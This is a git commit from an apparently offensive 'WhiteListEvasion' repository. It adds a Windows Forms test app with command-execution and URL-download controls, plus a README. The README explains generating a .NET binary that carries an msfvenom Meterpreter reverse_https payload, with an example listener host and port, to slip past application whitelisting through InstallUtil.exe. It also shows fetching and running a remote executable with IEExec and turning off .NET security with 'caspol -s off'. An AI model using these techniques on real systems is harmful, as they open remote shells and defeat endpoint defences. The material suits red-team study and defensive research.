aa5d5da8f2e72016a33dae3bafa3b7d6af96db10
khr0x40sh <khr0x40sh@gmail.com>
2015-05-27 16:04:37 -0700

    New Structure

---
+++ IEExec/test64/Form1.Designer.cs
@@ -0,0 +1,188 @@
+﻿namespace test64
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.openFileDialog1 = new System.Windows.Forms.OpenFileDialog();
+            this.browsebtn = new System.Windows.Forms.Button();
+            this.exBtn = new System.Windows.Forms.Button();
+            this.label2 = new System.Windows.Forms.Label();
+            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
+            this.DownloadStringBtn = new System.Windows.Forms.Button();
+            this.groupBox1 = new System.Windows.Forms.GroupBox();
+            this.groupBox2 = new System.Windows.Forms.GroupBox();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.label3 = new System.Windows.Forms.Label();
+            this.groupBox1.SuspendLayout();
+            this.groupBox2.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(4, 32);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(314, 20);
+            this.textBox1.TabIndex = 0;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(11, 16);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(132, 13);
+            this.label1.TabIndex = 1;
+            this.label1.Text = "Command/File to Execute:";
+            this.label1.Click += new System.EventHandler(this.label1_Click);
+            // 
+            // browsebtn
+            // 
+            this.browsebtn.Location = new System.Drawing.Point(162, 58);
+            this.browsebtn.Name = "browsebtn";
+            this.browsebtn.Size = new System.Drawing.Size(75, 23);
+            this.browsebtn.TabIndex = 2;
+            this.browsebtn.Text = "Browse...";
+            this.browsebtn.UseVisualStyleBackColor = true;
+            this.browsebtn.Click += new System.EventHandler(this.browsebtn_Click);
+            // 
+            // exBtn
+            // 
+            this.exBtn.Location = new System.Drawing.Point(243, 58);
+            this.exBtn.Name = "exBtn";
+            this.exBtn.Size = new System.Drawing.Size(75, 23);
+            this.exBtn.TabIndex = 3;
+            this.exBtn.Text = "Execute";
+            this.exBtn.UseVisualStyleBackColor = true;
+            this.exBtn.Click += new System.EventHandler(this.exBtn_Click);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(13, 108);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(42, 13);
+            this.label2.TabIndex = 4;
+            this.label2.Text = "Output:";
+            // 
+            // richTextBox1
+            // 
+            this.richTextBox1.Location = new System.Drawing.Point(16, 124);
+            this.richTextBox1.Name = "richTextBox1";
+            this.richTextBox1.Size = new System.Drawing.Size(636, 246);
+            this.richTextBox1.TabIndex = 5;
+            this.richTextBox1.Text = "";
+            // 
+            // DownloadStringBtn
+            // 
+            this.DownloadStringBtn.Location = new System.Drawing.Point(146, 58);
+            this.DownloadStringBtn.Name = "DownloadStringBtn";
+            this.DownloadStringBtn.Size = new System.Drawing.Size(156, 23);
+            this.DownloadStringBtn.TabIndex = 6;
+            this.DownloadStringBtn.Text = "Download String";
+            this.DownloadStringBtn.UseVisualStyleBackColor = true;
+            this.DownloadStringBtn.Click += new System.EventHandler(this.DownloadStringBtn_Click);
+            // 
+            // groupBox1
+            // 
+            this.groupBox1.Controls.Add(this.textBox1);
+            this.groupBox1.Controls.Add(this.browsebtn);
+            this.groupBox1.Controls.Add(this.exBtn);
+            this.groupBox1.Controls.Add(this.label1);
+            this.groupBox1.Location = new System.Drawing.Point(12, 7);
+            this.groupBox1.Name = "groupBox1";
+            this.groupBox1.Size = new System.Drawing.Size(324, 89);
+            this.groupBox1.TabIndex = 7;
+            this.groupBox1.TabStop = false;
+            this.groupBox1.Text = "Command Execution Test";
+            // 
+            // groupBox2
+            // 
+            this.groupBox2.Controls.Add(this.textBox2);
+            this.groupBox2.Controls.Add(this.label3);
+            this.groupBox2.Controls.Add(this.DownloadStringBtn);
+            this.groupBox2.Location = new System.Drawing.Point(350, 7);
+            this.groupBox2.Name = "groupBox2";
+            this.groupBox2.Size = new System.Drawing.Size(310, 89);
+            this.groupBox2.TabIndex = 8;
+            this.groupBox2.TabStop = false;
+            this.groupBox2.Text = "WebClient Test";
+            // 
+            // textBox2
+            // 
+            this.textBox2.Location = new System.Drawing.Point(4, 32);
+            this.textBox2.Name = "textBox2";
+            this.textBox2.Size = new System.Drawing.Size(298, 20);
+            this.textBox2.TabIndex = 8;
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(6, 16);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(74, 13);
+            this.label3.TabIndex = 7;
+            this.label3.Text = "URL to String:";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(664, 382);
+            this.Controls.Add(this.groupBox2);
+            this.Controls.Add(this.groupBox1);
+            this.Controls.Add(this.richTextBox1);
+            this.Controls.Add(this.label2);
+            this.Name = "Form1";
+            this.Text = "IEExec Test";
+            this.groupBox1.ResumeLayout(false);
+            this.groupBox1.PerformLayout();
+            this.groupBox2.ResumeLayout(false);
+            this.groupBox2.PerformLayout();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.OpenFileDialog openFileDialog1;
+        private System.Windows.Forms.Button browsebtn;
+        private System.Windows.Forms.Button exBtn;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.RichTextBox richTextBox1;
+        private System.Windows.Forms.Button DownloadStringBtn;
+        private System.Windows.Forms.GroupBox groupBox1;
+        private System.Windows.Forms.GroupBox groupBox2;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.Label label3;
+    }
+}
+
---
+++ README.md
@@ -0,0 +1,26 @@
+# WhiteListEvasion
+
+1. InstallUtil.py
+
+   Usage:
+   python InstallUtil.py [--cs_file cs_filename] [--exe_name exe_filename] [--payload payload] [--lhost lhost] [--lport lport]
+
+   python InstallUtil.py --cs_file temp.cs --exe_name temp.exe --payload windows/meterpreter/reverse_https --lhost 192.168.1.11 --lport 443
+
+   Script that generates a .NET binary that attempts to leverage the InstallUtil.exe whitelist evasion technique.  this is accomplished by importing a msfvenom generated payload into the c_sharp template found here: http://www.room362.com/blog/2014/01/16/application-whitelist-bypass-using-ieexec-dot-exe/  . This template is then incorporated into the InstallUtil PoC found here: https://github.com/subTee/ShmooCon-2015/blob/master/CaseySmith-SimpleWindowsApplicationWhitelistingEvasion .  One thing of note:  The payload architecture must match the Framework subdir in the .NET path or the binary will crash.
+
+  Script.cs and script.exe are example output from InstallUtil.py.  To execute the execute, simply get the binary on disk and then run (something much like):
+  C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U script.exe
+
+  Requires mono, mono-develop, Python 2.7+, msfvenom (from metasploit). Tested and verified the script on a Kali linux VM.  Both 32-bit and 64-bit binaries tested and verified on Windows 7 with .NET 4.5.    
+
+2. Test64 (IEExec 64-bit test application)
+
+	Host this binary on a webserver.  To observe the binary without .NET Security, open up an administrative console, cd to C:\Windows\Microsoft.NET\Framework\v2.05727\ and then run 'caspol -s off'.  In an another window (can be non administrative), cd to the same .NET directory and execute IEExec <path to your file hosted on webserver>.  An example would look like this:
+	C:\Windows\Microsoft.NET\Framework\v2.05727\> IEExec http://testserver.org/files/test64.exe
+	
+	To observe with .NET Security enabled, just simply run the above without ever disabling caspol.  You should be able to pull down strings from a file hosted by a webserver, but unable to execute,read, or write anything on the host system.
+	
+	To build the binary, ensure you have the x64 profile set in Visual Studio 2013.
+	
+khr0x40sh@gmail.com 
